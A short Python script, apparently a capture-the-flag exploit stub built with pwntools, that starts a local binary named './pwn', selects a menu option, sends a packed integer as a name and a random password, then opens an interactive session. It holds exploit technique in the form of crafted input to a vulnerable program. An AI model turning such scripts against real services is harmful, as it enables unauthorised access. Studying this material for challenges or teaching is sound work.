from pwn import *
import os

passwd = os.urandom(0x10)




io = process("./pwn")

io.recvuntil(b"Your choice: ")
io.sendline(b"1")
io.recvuntil(b"Input your name: ")
io.sendline(p64(0x696D6e61))
io.sendline(passwd)
io.interactive()
